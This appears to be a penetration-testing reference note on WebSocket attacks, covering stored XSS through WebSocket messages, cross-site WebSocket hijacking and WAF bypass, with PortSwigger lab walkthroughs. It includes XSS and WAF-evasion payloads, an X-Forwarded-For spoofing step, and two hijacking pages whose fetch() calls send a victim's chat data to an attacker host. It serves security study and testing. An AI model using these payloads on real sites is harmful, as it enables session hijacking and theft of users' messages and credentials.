---
title: "Web Sockets & CSWSH"
type: technique
tags: [csrf, exploitation, injection, web, websocket, xss]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [payloadsallthethings-websockets, git-portswigger-all-labs]
---

# Web Sockets

## What it is

WebSocket is a communication protocol that provides full-duplex communication channels over a single, long-lived TCP connection. It enables real-time, bi-directional communication between clients and servers. WebSockets start as an HTTP request with an `Upgrade: websocket` header, to which the server responds with an `HTTP 101 Switching Protocols`.

WebSockets shine in scenarios requiring low-latency, real-time, or server-initiated communication — live chat, stock tickers, multiplayer games, collaborative tools.

### HTTP vs WebSockets

| Feature | HTTP | WebSockets |
| --- | --- | --- |
| **Connection Model** | Request → Response (one-way) | Bidirectional (full-duplex) |
| **Persistence** | Short-lived | Long-lived |
| **Latency** | Higher (repeated connections) | Low (persistent connection) |
| **Use Case** | Static/standard websites | Real-time apps (chat, games, etc.) |
| **Initiation** | Uses HTTP request | Starts as HTTP, then upgrades |
| **Data Flow** | One-way (client → server) | Two-way (client ⇄ server) |

### Establishing a Connection

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

- `ws://` — insecure WebSocket
- `wss://` — TLS-encrypted WebSocket

Once the handshake completes, the connection stays open for bidirectional messaging until either party closes it.

---

## Attack Surface

WebSocket vulnerabilities typically fall into three categories:

1. **Message manipulation** — injecting malicious payloads into WebSocket messages (XSS, SQLi, etc.)
2. **Handshake manipulation** — modifying headers during the HTTP→WebSocket upgrade to bypass controls
3. **Cross-Site WebSocket Hijacking (CSWSH)** — CSRF against the WebSocket handshake to steal an authenticated session

---

## Message Manipulation / Stored XSS via WebSocket

If user-supplied WebSocket messages are reflected or stored and then rendered in a chat or UI without sanitisation, XSS is possible.

**Attack flow:**
1. Open the target chat/live feature; observe messages pass over WebSocket in Burp's WebSocket history.
2. Send a message to Burp Repeater (WebSocket tab).
3. Replace the message body with an HTML/JS payload.
4. Send via Repeater — if the content is reflected server-side into the DOM, it persists across page refreshes (stored XSS).

**Payloads:**

```
{"message":"<img src=1 onerror='alert(1)'>"}
```

```
{"message":"<h2>test</h2>"}
```

Key distinction: a client-side-only injection disappears on refresh. Sending the same payload through Burp Repeater as a server-destined message makes the change permanent (stored).

---

## Cross-Site WebSocket Hijacking (CSWSH)

If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it is possible to use the authenticated WebSocket of a victim on an attacker-controlled site because the browser automatically sends cookies during the handshake.

### How It Works

1. The vulnerable application uses HTTP cookies for authenticating WebSocket connections.
2. It does not implement CSRF protection (no tokens, no unpredictable headers).
3. An attacker creates a malicious web page on a different origin.
4. When a victim (already authenticated) visits the attacker's page:
   - A WebSocket connection is made from the attacker's page to the vulnerable application.
   - The server accepts the handshake because it trusts the automatically-sent cookies.
   - The attacker gains two-way interaction with the server in the victim's session context.

### Impact

- Send arbitrary WebSocket messages as the victim
- Read responses (including full chat history if the server sends it on connect)
- Sensitive data leakage (credentials, PII)
- Full session compromise

### Identifying CSWSH Vulnerability

Inspect the WebSocket handshake request in Burp's WebSocket history:
- Is authentication based solely on the session cookie?
- Are there any CSRF tokens, `Sec-WebSocket-Key` checks, or origin validation?
- Does the server send historical data immediately after the `READY` or equivalent init message?

### Exploit

**Basic CSWSH exfiltration:**
```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("READY");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
</script>
```

*Note:* If the application uses a `Sec-WebSocket-Protocol` header, pass its value as the second argument to `WebSocket()`.

**With Burp Collaborator (Burp Pro):** Replace the `fetch` URL with your Collaborator payload URL. Collaborator interactions will contain the exfiltrated data.

**Without Burp Pro — using exploit server access log:** Replace the `fetch` URL with the exploit server's domain; check the access log after victim delivery.

---

## Handshake Manipulation / WAF/IP-Block Bypass

Some applications use WAFs or rate-limiting that block suspicious payloads during or after the WebSocket handshake. If your XSS payload triggers an IP block:

1. Reconnect and add a spoofed IP header to the handshake request (via Burp Repeater):
```
X-Forwarded-For: <spoofed-ip>
```
2. Modify the payload slightly to evade the WAF signature while retaining the injection.

**Typical workflow in Burp:**
1. Intercept the WebSocket upgrade request (HTTP).
2. Add/modify headers (`Origin`, `X-Forwarded-For`, `Sec-WebSocket-Protocol`) before forwarding.
3. The server establishes the WebSocket on the manipulated handshake.
4. Continue sending messages through the now-established connection.

---

## Tools

### wsrepl

A WebSocket REPL for pentesters by Doyensec. It simplifies the auditing of WebSocket-based apps, offering an interactive interface and easy automation via plugins.

```bash
wsrepl -u URL -P auth_plugin.py
```

### ws-harness.py

Acts as a proxy between a traditional security tool (like `sqlmap`) and a WebSocket endpoint.

1. Start `ws-harness` listening on a WebSocket with a message template containing `[FUZZ]`:
```bash
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```
2. Use tools like `sqlmap` against the newly created local web service proxy:
```bash
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

### Burp Suite

- **WebSocket history tab** — passively captures all WebSocket frames (both client→server and server→client).
- **Repeater (WebSocket tab)** — replay and modify individual frames; reconnect as needed.
- **Exploit server** — host CSWSH payloads and inspect access logs for exfiltrated data.

### Other Tools

- **Socket.IO:** Common JS library that abstracts WebSockets. Requires specific connection handshake payloads.
- [snyk/socketsleuth](https://github.com/snyk/socketsleuth) — Burp Extension for testing WebSockets.
- [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) — Fuzz WebSockets with custom Python code.

---

## PortSwigger Labs

### Lab 1 — Manipulating WebSocket messages to exploit vulnerabilities *(Apprentice)*

**Vulnerability:** Stored XSS via unsanitised WebSocket message reflection.

**Steps:**
1. Open the chat feature; observe WebSocket frames in Burp WebSocket history.
2. Send a client→server chat message to Burp Repeater (WebSocket tab).
3. Replace the message body with an XSS payload targeting the img `onerror` attribute:
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```
4. Send via Repeater as a server-destined message (not just a local DOM change).
5. The server stores and reflects the content — alert fires on page load/refresh, confirming stored XSS.

**Key insight:** Client-side-only payload injection disappears on refresh. The payload must be sent server-side through Repeater to persist.

---

### Lab 2 — Cross-site WebSocket hijacking *(Practitioner)*

**Vulnerability:** WebSocket handshake authenticated only by session cookie; no CSRF protection.

**Steps:**
1. Chat with the support agent; observe the WebSocket handshake in Burp.
2. Confirm: only the session cookie identifies the user — no CSRF token or unpredictable header.
3. Note: on connection, the server immediately pushes full chat history after a `READY` message.
4. Craft a malicious page that opens a WebSocket to the target and sends `READY`:
```html
<script>
  var ws = new WebSocket('wss://TARGET/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(e) {
    fetch('https://COLLABORATOR-OR-EXPLOIT-SERVER/?d='+encodeURIComponent(e.data), {mode:'no-cors'});
  };
</script>
```
5. Host on exploit server and deliver to victim.
6. Retrieve exfiltrated chat history from Burp Collaborator interactions or exploit server access log.
7. Extract credentials from the chat history and log in to solve the lab.

**Exfiltration options:**
- Burp Collaborator (Burp Pro): interactions tab shows all received requests.
- Exploit server access log (free): replace fetch URL with exploit server domain.

---

### Lab 3 — Manipulating the WebSocket handshake to exploit vulnerabilities *(Practitioner)*

**Vulnerability:** XSS via WebSocket messages, with WAF/IP-blocking that detects known payloads.

**Steps:**
1. Intercept a WebSocket message containing an XSS payload; observe the IP is blocked after sending.
2. Reconnect to the WebSocket in Burp Repeater.
3. Add a spoofed IP header to the handshake request before the connection is upgraded:
```
X-Forwarded-For: <spoofed-ip>
```
4. Modify the XSS payload to evade the WAF signature while retaining the injection:
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```
5. Send via Repeater — the WAF no longer matches the known pattern; the alert fires and the lab is solved.

**Key insight:** WAF bypasses in WebSocket contexts follow the same obfuscation techniques as HTTP — case variation, alternative event handlers, backtick syntax, encoding.
